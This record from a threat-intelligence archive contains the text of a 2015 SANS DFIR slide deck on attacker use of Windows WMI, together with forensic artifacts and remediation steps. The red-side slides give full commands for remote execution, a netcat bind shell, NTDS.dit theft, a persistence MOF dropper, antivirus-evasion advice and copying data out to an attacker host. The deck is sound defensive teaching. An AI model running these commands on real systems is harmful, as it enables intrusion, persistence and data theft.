{
    "id": "675d93aa-16a0-4e87-94a4-47c548c40bd2",
    "created_at": "2022-10-25T16:48:21.317273Z",
    "updated_at": "2025-03-27T02:11:26.866596Z",
    "deleted_at": null,
    "sha1_hash": "195d8df2dc2070cf12f8325bf4755e6920ced996",
    "title": "PowerPoint Presentation",
    "authors": "",
    "file_creation_date": "2015-07-09T08:03:12Z",
    "file_modification_date": "2015-07-09T08:03:12Z",
    "file_size": 1383034,
    "plain_text": "# THERE’S SOMETHING ABOUT WMI\n\n##### SANS DFIR SUMMIT 2015\n\n\n-----\n\n# OVERVIEW AND BACKGROUND\n\n\n-----\n\n# BACKGROUND\n\n#####  2014 – Mandiant investigations saw multiple threat groups adopt WMI for persistence\n\n  Used “The Google” and found little mainstream forensic info on using WMI for persistence\n\n  One mainstream reference:\n\n    - http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp__understanding-wmimalware.pdf\n\n\n-----\n\n# OVERVIEW\n\n#####  What is WMI and how can you interact with it\n\n  Red side:\n\n    - How to use WMI during each phase of an intrusion\n\n    - How to undermine detection when using WMI\n\n    - Some of the ways WMI can be used to achieve persistence\n\n#####  Blue side:\n\n    - Forensic artifacts generated when WMI has been used\n\n    - Ways to increase the forensic evidence of WMI to benefit your investigations\n\n#####  Review some case studies involving WMI and targeted threat actors\n\n  Q&A\n\n\n-----\n\n# WINDOWS MANAGEMENT INSTRUMENTATION (WMI)\n\n#####  What is WMI?\n\n    - Framework for managing Windows systems\n\n    - Syntax resembles a structured query\n\n    - Limited technical documentation\n\n    - Primary endpoint components include:\n\n        - Collection of managed resource definitions (objects.data)\n\n             - Physical or logical objects that can be managed by WMI via namespaces\n\n             - Structure appears informally organized\n\n        - Binary Tree Index\n\n             - List of managed object format (MOF) files imported into objects.data\n\n\n-----\n\n# WMI CONTINUED\n\n#####  WMI present by default on all Microsoft OS’ >= 2000\n\n  Powerful, but requires admin privileges to use\n\n  Directly accessible using “wmic.exe” (CLI)\n\n  Has a SQL-like structured query language (WQL)\n\n  Allows for remote system management\n\n  Supports several scripting languages\n\n    - Windows Script Host (WSH)\n\n        - VBScript (ugh)\n\n        - JScript (blech)\n\n    - PowerShell (*guitar sounds*)\n\n\n-----\n\n# WMI SYNTAX TO LIST PROCESSES ON REMOTE HOST\n```\n      wmic.exe /node:[SYSTEM] /user:[USERNAME]\n      /password:[PASSWORD] process get name,processid\n\n```\n\n-----\n\n# WMI CONTINUED\n\n#####  Most functionality stored in default namespace (library of object classes) called “Root\\\\CIMv2”\n\n  CIMv2 classes include\n\n    - Hardware\n\n    - Installed applications\n\n    - Operating System functions\n\n    - Performance and monitoring\n\n    - WMI management\n\n\n-----\n\n# MANAGED OBJECT FORMAT (MOF) FILES\n\n#####  What if we want to add/extend the functionality of WMI?\n\n  Solution: MOF files\n\n    - Can be used to implement new namespaces and classes\n\n        - Define new properties or create new methods for interacting with WMI\n\n    - Portable, create once use many\n\n    - Compiled on the system with “mofcomp.exe”\n\n    - Support autorecovery via the “pragma autorecover” feature\n\n        - At the command line:\n\n             - `mofcomp.exe –autorecover my.mof`\n\n        - Alternatively, include “#pragma autorecover” in MOF file\n\n        - Prior to Vista, any MOF file in “%SYSTEMROOT%\\wbem\\mof\\” would be automatically compiled and\nimported into objects.data at startup (no autorecovery required)\n\n\n-----\n\n# EXAMPLE MOF AUTORECOVERY\n\n```\n #PRAGMA AUTORECOVER\n #pragma classflags (\"updateonly\", \"forceupdate\")\n #pragma namespace(\"\\\\\\\\.\\\\root\\\\subscription\")\n instance of __EventFilter as $EventFilter\n {\n   EventNamespace = \"Root\\\\Cimv2\";\n   Name = \"_SM.EventFilter\";\n   Query = \"Select * From __InstanceModificationEvent Where TargetInstance Isa \\\"Win32_LocalTime\\\"\n And TargetInstance.Second=5\";\n   QueryLanguage = \"WQL\";\n };\n\n```\n\n-----\n\n# INTERACTING WITH WMI\n\n\n-----\n\n# HOW TO WMI\n\n#####  WMIC – native Windows command line interface to WMI\n\n  WinRM – Windows Remote Management command line interface\n\n  WMI-Shell – Linux WMI client (bridges *NIX to Windows)\n\n    - [http://www.lexsi.com/Windows-Management-Instrumentation-Shell.html](http://www.lexsi.com/Windows-Management-Instrumentation-Shell.html)\n\n#####  Impacket – Python classes for WMI\n\n  Open Asset Logger – WMI client that identifies systems on the local network and uses predefined WMI queries\n\n    - [http://sourceforge.net/projects/openassetlogger/](http://sourceforge.net/projects/openassetlogger/)\n\n#####  PowerShell – Windows scripting framework\n\n\n-----\n\n# WMIC\n\n#####  Interface to WMI\n\n  Includes aliases that map complex WMI queries to simple commands\n\n  Requires administrator privileges to use (otherwise errors)\n\n\n##### Requires administrator privileges to use (otherwise errors)\n\n\n-----\n\n# WINDOWS REMOTE MANAGEMENT\n\n#####  Command line interface to WinRM\n\n  Supports querying remote systems\n\n  Note that WinRM uses HTTPS by default – attackers like encryption\n\n  Can invoke WMI via “GET” operator\n\n  Example use to query attributes of remote “spooler” service:\n\n    - `winrm get wmicimv2/Win32_Service?Name=spooler –r:<remote system>`\n\n\n-----\n\n# WMI SHELL\n\n#####  Developed by Lexsi, originally\n\n  Allows WMI commands to be run from Linux systems on remote Windows endpoints\n\n    - Written in Python and VBScript\n\n    - Only communicates over port 135\n\n#####  Was ported by Jesse Davis (@secabstraction) to Windows as “Posh-WmiShell.psm1”\n\n    - Pure PowerShell\n\n    - Doesn’t write any VBScript to disk on remote system\n\n\n-----\n\n# IMPACKET SCRIPTS\n\n#####  Part of CoreLabs Impacket\n\n  wmiexec.py is a python class for remote WMI command execution\n\n    - Doesn’t run as SYSTEM\n\n    - Requires DCOM\n\n#####  wmiquery.py is a python class that can be used for running remote WMI queries\n\n\n-----\n\n# OPEN ASSET LOGGER\n\n#####  Developed by John Thomas\n\n  Executes pre-built WMI queries\n\n  Practical offensive use limited to reconnaissance (opinion)\n\n  Can query a single machine or all systems in a domain\n\n\n-----\n\n# POWERSHELL\n\n#####  Most powerful way to interact with WMI (opinion)\n\n  Allows for a multitude of response formatting options\n\n  PowerShell scripts are portable\n\n  Only requires the source system to have PowerShell installed when interacting with WMI remotely\n\n  Do you PowerSploit?\n\n\n-----\n\n# MALICIOUS USE CASES\n\n\n-----\n\n# WAYS ATTACKERS USE WMI\n\n#####  Reconnaissance\n\n  Lateral movement\n\n  Establish a foothold\n\n  Privilege escalation\n\n  Maintain persistence\n\n  Data theft\n\n\n-----\n\n# RECONNAISSANCE\n\n#####  List patches installed on the local workstation with WMIC\n\n    - `wmic qfe get description,installedOn /format:csv`\n\n#####  List information on currently running processes with WMIC\n\n    - `wmic process get caption,executablepath,commandline`\n\n#####  List user accounts with WMIC\n\n    - `wmic useraccount get /ALL`\n\n\n-----\n\n# RECONNAISSANCE CONTINUED\n\n#####  Identify whether a target system is a SQL server using WMI\n\n    - `wmic /node:”192.168.0.1” service where (caption like “%sql server (%”)`\n\n#####  List network shares on a remote system using WMI and PowerShell\n\n    - `get-wmiobject –class “win32_share” –namespace “root\\CIMV2” –computer`\n```\n    “targetname”\n\n```\n\n-----\n\n# LATERAL MOVEMENT\n\n#####  Invoke a command on a remote system using WMI (note that this example is applicable to multiple phases of the attack life cycle):\n\n    - `wmic /node:REMOTECOMPUTERNAME process call create “COMMAND AND ARGUMENTS\"`\n\n\n-----\n\n# ESTABLISH A FOOTHOLD\n\n#####  Execute commands on a remote system using WMI\n\n    - `wmic /NODE: “192.168.0.1” process call create “evil.exe”`\n\n    - Seriously, “process call create” is amazing\n\n\n-----\n\n# PRIVILEGE ESCALATION\n\n#####  Three types of escalation:\n\n    - Scheduled tasks\n\n        - When you need something to run as SYSTEM (credential harvesting, for example)\n\n             - `wmic /node:REMOTECOMPUTERNAME PROCESS call create “at 9:00PM`\n```\n          c:\\GoogleUpdate.exe ^> c:\\notGoogleUpdateResults.txt\"\n\n```\n    - Volume Shadow Copy\n\n        - Get the NTDS.dit database and crack some passwords\n\n             - `wmic /node:REMOTECOMPUTERNAME PROCESS call create “cmd /c vssadmin`\n```\n          create shadow /for=C:\\Windows\\NTDS\\NTDS.dit > c:\\not_the_NTDS.dit“\n\n```\n             - Don’t forget the SYSTEM and optionally the SAM hives (if you want local hashes)\n\n    - Process impersonation\n\n        - Helps in situations where the WMI provider you want to use doesn’t have rights to behave as desired\n\n\n-----\n\n# EXAMPLE PROCESS IMPERSONATION USING VBSCRIPT\n\n```\n  If args.Length = 0 Then\n    Usage()\n  Else\n    If strComputer = \".\" Then\n        Set objWMIService = GetObject(\"winmgmts:{impersonationLevel=Impersonate}!\\\\.\\root\\cimv2\")\n    Else\n        Set objSWbemLocator = CreateObject(\"WbemScripting.SWbemLocator\")\n        Set objWMIService = objSWbemLocator.ConnectServer(strComputer, _\n          \"root\\CIMV2\", _\n          strUser, _\n          strPassword, _\n          \"MS_409\", _\n          \"ntlmdomain:\" + strDomain)\n    End If\n\n```\n\n-----\n\n# MAINTAIN PERSISTENCE\n\n#####  WMI Persistence requires three components\n\n    - An event filter – the condition we’re waiting for\n\n        - _EventFilter objects have a name and a “trigger”\n\n    - An event consumer – the persistence payload\n\n        - _EventConsumer objects have a name and one of the following:\n\n             - A script (contained in objects.data)\n\n             - A path to an external script (somewhere on disk)\n\n             - A path to an executable (not a script, also on disk)\n\n        - Pre-Vista ran as SYSTEM\n\n        - Post-Vista run as LOCAL SERVICE\n\n    - A binding that associates a filter to a consumer\n\n        - _FilterToConsumerBinding objects reference an event filter and an event consumer\n\n\n-----\n\n# MOST USEFUL STANDARD FILTERS\n\n#####  “Standard” filters included in default CIMv2 namespace\n\n  _EventFilter classes include\n\n    - Win32_LocalTime – a time condition like once per minute\n\n    - Win32_Directory – the presence of a file or directory\n\n    - Win32_Service – whenever a service starts or stops\n\n    - …many, many more Operating System classes in CIMv2\n\n\n-----\n\n# EXAMPLE _EVENTFILTER USING WIN32_LOCALTIME\n\n```\n $instanceFilter=([wmiclass]”\\\\.\\root\\subscription:_EventFilter”_)\n .CreateInstance()\n $instanceFilter.QueryLanguage = “WQL”\n $instanceFilter.Query = “SELECT * FROM\n __InstanceModificationEvent Where TargetInstance ISA\n 'Win32_LocalTime' AND TargetInstance.Second=5”\n $instanceFilter.Name=“SneakyFilter”\n $instanceFilter.EventNameSpace = ‘root\\Cimv2\n\n```\n\n-----\n\n# MOST USEFUL STANDARD CONSUMERS\n\n#####  CommandLineEventConsumer\n\n    - Executes a command and arguments\n\n        - `“powershell.exe mypayload.ps1”`\n\n        - `“wscript.exe c:\\mypayload.js”`\n\n        - `“c:\\nc.exe –l –p 2121 –e cmd.exe”`\n\n#####  ActionScriptEventConsumer\n\n    - Uses Windows Script Host (WSH)\n\n        - https://www.mandiant.com/blog/ground-windows-scripting-host-wsh/\n\n    - Runs scripts natively supported by WSH\n\n        - JScript\n\n        - VBScript\n\n\n-----\n\n# EXAMPLE ACTIONSCRIPTEVENTCONSUMER\n\n```\n $instanceConsumer =\n ([wmiclass]\"\\\\.\\root\\subscription:ActionScriptEventConsumer\").Cre\n ateInstance()\n $instanceConsumer.Name = “SneakyConsumer”\n $instanceConsumer.ScriptingEngine = “JScript”\n $instanceConsumer.ScriptFileName =\n “C:\\users\\dkerr\\appdata\\temp\\sneak.js”\n\n```\n\n-----\n\n# EXAMPLE COMMANDLINEEVENTCONSUMER\n\n```\n Instance CommandLineEventConsumer as $CMDLINECONSUMER\n {\n Name = “Sneaky Consumer”;\n CommandLineTemplate = “c:\\\\Temp\\\\sneak.exe /e /V /i /L”;\n RunInteractively = False;\n WorkingDirectory = “c:\\\\”;\n }\n\n```\n\n-----\n\n# CREATE A FILTER TO CONSUMER BINDING\n\n#####  The _EventFilter and _EventConsumer have to be associated for persistence\n\n    - Note that we defined $Consumer as “SneakyConsumer” and $EventFilter as “SneakyFilter” in previous\nexamples\n\n\n-----\n\n# EXAMPLE COMMANDLINEEVENTCONSUMER\n\n```\n instance of __FilterToConsumerBinding\n {\n   Consumer  = $Consumer;\n   Filter = $EventFilter;\n };\n\n```\n\n-----\n\n# LET S PUT IT ALL TOGETHER\n\n#####  One of the easier ways to accomplish this is to throw everything in a MOF file\n\n\n-----\n\n# EXAMPLE MOF FILE, C:\\WINDOWS\\TEMP\\SNEAK.MOF\n\n```\n #PRAGMA AUTORECOVER\n #pragma classflags (\"updateonly\", \"forceupdate\")\n #pragma namespace(\"\\\\\\\\.\\\\root\\\\subscription\")\n instance of __EventFilter as $EventFilter\n {\n    EventNamespace = \"Root\\\\Cimv2\";\n    Name = \"_SM.EventFilter\";\n    Query = \"Select * From __InstanceModificationEvent Where TargetInstance Isa \\\"Win32_LocalTime\\\" And TargetInstance.Second=5\";\n    QueryLanguage = \"WQL\";\n };\n instance of ActiveScriptEventConsumer as $Consumer\n {\n    Name = \"_SM.ConsumerScripts\";\n    ScriptingEngine = \"JScript\";\n    ScriptText = \"oFS = new ActiveXObject('Scripting.FileSystemObject');JF='C:/Windows/Addins/%Mutex%';oMutexFile =\n null;try{oMutexFile = oFS.OpenTextFile(JF, 2, true);}catch(e){}\"\n           \"CoreCode = ‘INSERT BASE64 ENCODED SCRIPT HERE’ ';\"\n           \"if(oMutexFile){oMutexFile.Write(unescape(CoreCode));oMutexFile.Close();(new\n ActiveXObject('WScript.Shell')).Run('cscript /E:JScript '+JF, 0);}\";\n };\n instance of __FilterToConsumerBinding\n {\n    Consumer  = $Consumer;\n    Filter = $EventFilter;\n };\n\n```\n\n-----\n\n# EXTRA CREDIT: DEFINE YOUR OWN CLASS\n\n#####  Why bother?\n\n    - _EventFilter and _EventConsumer objects aren’t that common\n\n    - What if there was a sneakier way?\n\n#####  Solution: create a benign-sounding class in CIMv2 with a benign-sounding property and fill with badness\n\n    - Grab the PowerShell WMI module (powershelldistrict.com, “WMI-Module.psm1”)\n\n    - Syntax:\n```\n     New-WMIProperty –ClassName “Win32_MSUpdater” –PropertyName “CertificateStore” –\n     PropertyValue “<insert script here>”\n\n```\n    - Usage (call with PowerShell Invoke Expression!):\n\n        - `Invoke-Expression –Command`\n```\n       ([WmiClass]’Win32_MSUpdater’).Properties[‘CertificateStore’].Value\n\n```\n\n-----\n\n# WHY SHOULD YOU USE WMI FOR PERSISTENCE?\n\n#####  None of the tools mentioned in the persistence section will trigger antivirus or whitelisting applications\n\n    - wmic.exe and mofcomp.exe are trusted Windows binaries present on all Windows versions since 2000\n\n        - PowerShell is also trusted, but isn’t always installed\n\n    - Payload scripts are incredibly variable, with obfuscation this problem is compounded\n\n#####  With an ActiveX Object you can instantiate IE (also native) for C2\n\n    - Blend into normal network traffic\n\n    - Inherit proxy creds cached in browser\n\n    - No unique useragent to detect\n\n#####  There is no functional way to determine at scale if the script referenced in an MOF file, passed on the command line, or inserted into objects.data is malicious – in other words a filename is not a good indicator\n\n\n-----\n\n# FINALLY, DATA THEFT\n\n#####  Using WMI process call create\n\n    - `wmic /NODE: “192.168.0.1” /user:”Domain\\Administrator” /password:”1234” process`\n```\n    call create “xcopy “D:\\\\everything.rar” “\\\\ATTACKERHOST\\\\C$\\\\e.dat”\"\n\n#####  Using WMI and PowerShell\n\n```\n    - `(Get-WmiObject -Class CIM_DataFile -Filter 'Name=“D:\\\\everything.rar\"' -`\n```\n    ComputerName MYSERVER -Credential\n    'MYSERVER\\Administrator').Rename(\"\\\\\\\\ATTACKERHOST\\\\C$\\\\everything.rar\")\n\n```\n\n-----\n\n# FORENSIC ARTIFACTS\n\n\n-----\n\n# OBLIGATORY REFERENCE TO THE MOVIE TAKEN\n\n\n-----\n\n# OVERVIEW OF ARTIFACTS\n\n#####  In-memory\n\n  File system\n\n  Prefetch\n\n  Registry\n\n  WMI trace logs\n\n  Network\n\n\n-----\n\n# PROCESS MEMORY ARTIFACTS\n\n#####  Fragments of WMI commands may be found within the process memory for the following:\n\n    - wmiprvse.exe – WMI provider process\n\n    - svchost.exe – the specific process associated with the WinMgMt service\n\n    - csrss.exe or conhost.exe – command line subsystem and console host processes, XP/2003 or Vista and later\n\n#####  Reliable evidence of the following activities degrades quickly and is weak after any elapsed period of time (unless output files left behind)\n\n    - Reconnaissance\n\n    - Lateral Movement\n\n    - Privilege Escalation\n\n\n-----\n\n# PROCESS MEMORY CONTINUED\n\n\n-----\n\n# FILE SYSTEM MOF FILES\n\n#####  Malicious MOF files may still be present on disk\n\n    - Example: “C:\\Windows\\Addins\\evil.mof”\n\n    - Don’t assume there’s no infection because these files don’t exist anymore\n\n#####  MOF files may be copied into the autorecovery directory after the originals were deleted\n\n    - “C:\\Windows\\System32\\wbem\\autorecovery\\[RAND].mof”\n\n#####  References to MOF files may be found in the binary tree index\n\n    - “C:\\Windows\\System32\\wbem\\Repository\\index.btr”\n\n#### “f.mof” with no path\n\n\n-----\n\n# FILE SYSTEM CIM REPOSITORY\n\n#####  New WMI classes are stored in the CIM repository\n\n    - File location: “C:\\Windows\\System32\\wbem\\Repository\\fs\\objects.data”\n\n#####  String searches with the following terms may be helpful (does not scale, requires manual review):\n\n    - EventConsumer\n\n    - EventFilter\n\n    - FilterToConsumerBinding\n\n    - Wscript.shell\n\n    - Wscript.sleep\n\n    - On Error Resume Next\n\n#####  Note that most Windows systems will have the following legitimate filter and consumer:\n\n    - BVTFilter\n\n    - BVTConsumer\n\n\n-----\n\n# FILE SYSTEM CIM REPOSITORY CONTINUED\n\n#####  Example JScript (base64-encoded) found within objects.data as ActiveScriptEventConsumer:\n\n\n-----\n\n# PREFETCH\n\n#####  Prefetch files may capture useful command references\n\n    - Windows Scripting Host (WSH)\n\n        - C:\\Windows\\Prefetch\\CSCRIPT.EXE-E4C98DEB.pf\n\n        - C:\\Windows\\Prefetch\\WSCRIPT.EXE-65A9658F.pf\n\n    - WMI Standard Event Consumer\n\n        - C:\\Windows\\Prefetch\\SCRCONS.EXE-D45CB92D.pf\n\n    - MOF compiler\n\n        - C:\\Windows\\Prefetch\\MOFCOMP.EXE-CDA1E783.pf\n\n#####  Be aware that prefetch “accessedfiles” list may also reference the WSH, “mofcomp.exe”, or “scrcons.exe”, the script consumer executable\n\n    - Guaranteed to occur legitimately, pivot on metadata\n\n\n-----\n\n# REGISTRY\n\n#####  Binaries executed on remote systems may be recorded in the AppCompatCache registry key\n\n    - Without context this may appear to be legitimate activity – note that these occur often in most environments\n\n    - The following binaries may be relevant\n\n        - Cscript.exe\n\n        - Wscript.exe\n\n        - Wmic.exe\n\n        - Powershell.exe\n\n        - Scrcons.exe\n\n        - Mofcomp.exe\n\n\n-----\n\n# REGISTRY CONTINUED\n\n#####  The list of MOF files for autorecovery is stored in the following registry key:\n\n    - “HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WBEM\\CIMOM\\autorecover mofs”\n\n#####  Registering a WMI Event Filter which uses “Win32_LocalTime” causes the following empty registry key to be created\n\n    - “HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WBEM\\ESS\\//./root/CIMV2\\Win32ClockProvider”\n\n\n-----\n\n# WMI TRACE LOGS\n\n#####  Scenario: an attacker interacts with a target system through WMI - What is the default level of logging for this privileged activity? None.\n\n\n-----\n\n# WMI TRACE LOGS CONTINUED\n\n#####  Command to configure WMI trace logs\n\n    - ”wevtutil.exe sl Microsoft-Windows-WMI-Activity/Trace /e:true”\n\n         - May generate a significant amount of log activity (WMI is often used by legit applications)\n\n#####  If configured, which WMI trace logs capture activity?\n\n    - WMI-Activity Windows event log\n\n    - Pre-Vista, WMI Service logs stored in “%SYSTEMROOT%\\wbem\\logs\\”\n\n        - wbemcore.log\n\n        - mofcomp.log\n\n        - wbemprox.log\n\n\n-----\n\n# WMI ACTIVITY EVENT LOG EXAMPLE #1\n\n#####  Trace log capturing the following reconnaissance command:\n\n“wmic.exe /node:”192.168.1.1” service get pathname”\n\nYou can see the namespace referenced (Win32_Service) as well as the property (PathName) and info about the\nsource system (NetBIOS name) and user context\n\n\nYou can see the namespace referenced (Win32_Service) as well as the property (PathName) and info about the\n\n\n-----\n\n# WMI ACTIVITY EVENT LOG EXAMPLE #2\n\n#####  Trace log capturing the following command:\n\n“wmic.exe process call create ‘netstat –ano’”\n\n#####  Note that the name of the executable name is not always captured if Windows-native\n\n    - Process memory, appcompat, or prefetch may provide additional context\n\n\n-----\n\n# WMI SERVICE LOGS\n\n#####  Log sources you may find on pre-Vista systems\n\n  What is in each log source?\n\n    - wbemcore.log\n\n        - Logon activity and authentication failures (required setting: verbose)\n\n    - mofcomp.log\n\n        - Successful and failed MOF compile operations including the name and path of MOF files, whether it was\nimported, and failures (required setting: verbose)\n\n    - wbemprox.log\n\n        - Login failures based on incorrect credentials, service availability, or permissions issues (required setting:\nerrors or verbose)\n\n\n-----\n\n# WMI SERVICE LOG EXAMPLE ENTRIES\n\n#####  Wbemcore.log\n\n    - `(Mon Dec 09 11:13:59 2010.231145) : DCOM connection from DOMAIN\\Username at`\n```\n    authentication level Packet, AuthSvc = 9, AuthzSvc = 1, Capabilities = 0\n\n#####  Mofcomp.log\n\n```\n    - `(Sat Aug 01 11:13:21 2013.1675625) : Parsing MOF file C:\\evil.mof`\n\n#####  Wbemprox.log (hex codes have to be looked up)\n\n    - `(Tue Oct 01 17:01:07 2011.4653221) : NTLMLogin resulted in hr = 0x80041017`\n\n\n-----\n\n# NETWORK\n\n#####  PCAPs containing WMI queries can be easily parsed\n\n    - WMI uses DCOM and (MS)RPC by default\n\n        - Relatively easy to parse and analyze\n\n        - If you use WMI and supply explicit creds within a query/command guess what happens?\n\n             - More or less in the clear – this is why we can’t have nice things\n\n        - Most communications over TCP 135\n\n#####  Except when they can’t be parsed:\n\n    - Environments (ICS, Defense) where all traffic is pushed into IPSEC tunnels\n\n        - Very rare\n\n    - When WinRM was used (HTTPS)\n\n        - Applicable for both PowerShell and WinRM command line interaction\n\n\n-----\n\n# CASE STUDIES\n\n\n-----\n\n# CASE STUDY #1: USING WMI FOR RECONNAISSANCE\n\n#####  During Live Response of a system we found traces of WMI queries in process memory for “csrss.exe”\n\n    - WMI used to query the attributes of a user on a remote system\n\n        - `wmic.exe /node:”10.2.13.41” /user:”ABCAdmin” /password:”superman”`\n```\n       useraccount get AccountType,Description,Domain,Disabled,LocalAccount,SID\n\n```\n    - WMI used to list services on a remote system\n\n        - `wmic.exe /node:”10.2.13.41” /user:”ABCAdmin” /password:”superman” service`\n```\n       get Name,Caption,State,ServiceType,pathname\n\n```\n\n-----\n\n# CASE STUDY #2: USING WMI FOR PERSISTENCE\n\n#####  Observed callback to malicious C2 domain\n\n  No common persistence mechanism (Service, Run key, Stubpath, DLL search order hijacking, AppInit_DLL, etc)\n\n  String search showed malicious domain referenced in MOF file\n\n  Queried WMI for _EventFilter, _EventConsumer, and _FilterToConsumerBinding attributes\n\n  ActionScriptEventConsumer used to execute JScript configured to run once per minute using Win32_LocalTime class\n\n\n-----\n\n# CASE STUDY #2: USING WMI FOR PERSISTENCE CONTINUED\n\n#####  We identified the following registry key, modified on June 4, 2014:\n\n|Key|Value|Data|\n|---|---|---|\n|HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\ WBEM\\ESS\\//./root/CIMV2\\Win32ClockProvider|N/A|N/A|\n|Key Last Modified|||\n|06/04/14 01:30:03 UTC|||\n\n\n-----\n\n# CASE STUDY #3: DATA THEFT WITH WMI AND POWERSHELL\n\n#####  During analysis of a system we found the following in the pagefile (pagefile.sys):\n\n    - `(Get-WmiObject -Class CIM_DataFile -Filter`\n```\n    'Name=“F:\\\\Path\\To\\Secret\\Sauce\\20130102.rar\"' -ComputerName DOMAINCONTROLLER1     Credential\n    ‘DOMAINCONTROLLER1\\Administrator').Rename(\"\\\\\\\\WIN2K8AD01\\\\ADMIN$\\\\01.dat\")\n\n#####  The attacker used the rename() function to copy a file from the local system to a remote share\n\n```\n\n-----\n\n# REMEDIATION\n\n\n-----\n\n# REMEDIATING PERSISTENT WMI INFECTIONS\n\n#####  Scenario: an attacker infected one or more systems in your environment with a persistent WMI script\n\n    - Now what?\n\n\n-----\n\n# HOW TO REMOVE A WMI BACKDOOR\n\n#####  Use PowerShell\n\n    - Step 1: Identifiy the WMI EventFilter\n\n        - `get-wmiobject -namespace root\\subscription -query \"select * from`\n```\n       __EventFilter“\n\n```\n    - Step 2: Identifiy the WMI EventConsumer\n\n        - `get-wmiobject -namespace root\\subscription -query \"select * from`\n```\n       __EventConsumer“\n\n```\n    - Step 3: Identifiy the Binding\n\n        - `get-wmiobject -namespace root\\subscription –query \"select * from`\n```\n       __FilterToConsumerBinding”\n\n```\n\n-----\n\n# HOW TO REMOVE A WMI BACKDOOR CONTINUED\n\n#####  Continued…\n\n    - Step 4: Remove the malicious binding\n\n        - `gwmi –Namespace “root\\subscription” –class _FilterToConsumerBinding |`\n```\n       Remove-WMIObject –WhatIf\n\n```\n    - Step 5: Remove the malicious EventFilter\n\n        - `gwmi -Namespace \"root/subscription\" -Class __EventFilter | where name -eq`\n```\n       “sneakyfilter\" | Remove-WmiObject –WhatIf\n\n```\n    - Step 6: Remove the malicious EventConsumer\n\n        - `gwmi -Namespace \"root/subscription\" -Class LogFileEventConsumer | where name`\n```\n       -EQ “sneakyconsumer\" | Remove-WmiObject -WhatIf\n\n```\n\n-----\n\n# CONCLUSION\n\n\n-----\n\n# SUMMARY/LESSONS LEARNED\n\n#####  Targeted threat actors are increasingly relying on WMI, commodity actors are already adopting WMI which means de-confliction is a bigger challenge\n\n  WMI can be leveraged for nearly every phase of the compromise and by default leaves little evidence\n\n  WMI persistence easily defeats traditional AV, whitelisting, and can be overlooked when conducting forensic analysis\n\n  Process memory may contain some artifacts of WMI activity but fidelity quickly diminishes over time\n\n\n-----\n\n# ACKNOWLEDGEMENTS\n\n#####  Bob Wilton\n\n  Ryan Kazanciyan (@ryankaz42)\n\n  Matt Hastings\n\n  Matt Graeber (@mattifestation)\n\n  Jesse Davis (@secabstraction)\n\n\n-----\n\n# QUESTIONS?\n\n\n##### devon.kerr@mandiant.com\n @_devonkerr_\n\n\n-----\n\n# THE\n## END\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99fdc3ef-333d-48f5-a4a1-becd788c7b80",
            "created_at": "2022-10-25T15:28:29.802983Z",
            "updated_at": "2022-10-25T15:28:29.802983Z",
            "deleted_at": null,
            "name": "MITRE",
            "url": "https://github.com/mitre-attack/attack-stix-data",
            "description": "MITRE ATT&CK STIX Data",
            "reports": null
        }
    ],
    "references": [
        "https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/sans-dfir-2015.pdf"
    ],
    "report_names": [
        "sans-dfir-2015.pdf"
    ],
    "threat_actors": [
        {
            "id": "abd17060-62f6-4743-95e8-3f23c82cc229",
            "created_at": "2022-10-25T15:50:23.428772Z",
            "updated_at": "2025-03-27T02:00:55.466186Z",
            "deleted_at": null,
            "main_name": "Putter Panda",
            "aliases": [
                "Putter Panda",
                "APT2",
                "MSUpdater"
            ],
            "source_name": "MITRE:Putter Panda",
            "tools": [
                "pngdowner",
                "3PARA RAT",
                "4H RAT",
                "httpclient"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "468b7acd-895c-4c93-b572-b42f4035b4d4",
            "created_at": "2023-01-06T13:46:38.265636Z",
            "updated_at": "2025-03-27T02:00:02.788514Z",
            "deleted_at": null,
            "main_name": "APT2",
            "aliases": [
                "G0024",
                "PLA Unit 61486",
                "PUTTER PANDA",
                "MSUpdater",
                "4HCrew",
                "SearchFire",
                "TG-6952"
            ],
            "source_name": "MISPGALAXY:APT2",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "df9bfbf1-bb9d-492f-b381-95b9e1482267",
            "created_at": "2022-10-25T16:07:24.394491Z",
            "updated_at": "2025-03-27T02:02:10.207352Z",
            "deleted_at": null,
            "main_name": "Whitefly",
            "aliases": [
                "ATK 83",
                "Bronze Walker",
                "Mofang",
                "SectorM04",
                "TEMP.Mimic"
            ],
            "source_name": "ETDA:Whitefly",
            "tools": [
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Mimikatz",
                "Nibatad",
                "Shim RAT",
                "ShimRAT",
                "Vcrodat"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716501,
    "ts_updated_at": 1743041486,
    "ts_creation_date": 1436428992,
    "ts_modification_date": 1436428992,
    "files": {
        "pdf": "https://archive.orkl.eu/195d8df2dc2070cf12f8325bf4755e6920ced996.pdf",
        "text": "https://archive.orkl.eu/195d8df2dc2070cf12f8325bf4755e6920ced996.txt",
        "img": "https://archive.orkl.eu/195d8df2dc2070cf12f8325bf4755e6920ced996.jpg"
    }
}